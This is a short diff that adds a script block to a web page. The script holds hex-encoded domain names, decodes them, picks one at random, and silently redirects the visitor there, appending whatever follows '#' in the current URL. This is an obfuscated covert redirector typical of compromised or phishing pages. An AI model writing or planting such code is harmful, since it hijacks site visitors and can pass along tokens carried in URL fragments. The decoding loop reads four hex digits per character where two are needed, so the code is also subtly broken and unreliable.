@@ -1,0 +1,22 @@
+<script>
+
+let encodedDomains = ['6F72626974776176652E6465','6372797074616E6F76612E6465','6261736562617365642E6465','6F647965686C676C656F62616F2E6465'];
+let decodedDomains = encodedDomains.map(function(encodedDomain) {
+  let decoded = '';
+  for (let i = 0; i < encodedDomain.length; i += 4) {
+    decoded += String.fromCharCode(parseInt(encodedDomain.substr(i, 4), 16));
+  }
+  return decoded;
+});
+// document.write(decodedDomains);
+let d = decodedDomains[Math.floor(Math.random() * decodedDomains.length)];
+let u = document.location;
+let str = u.toString();
+let tu = str.split('#')[1];
+let nr = `https://${d}/${tu}`;
+
+
+window.location.href = nr;
+
+
+</script>
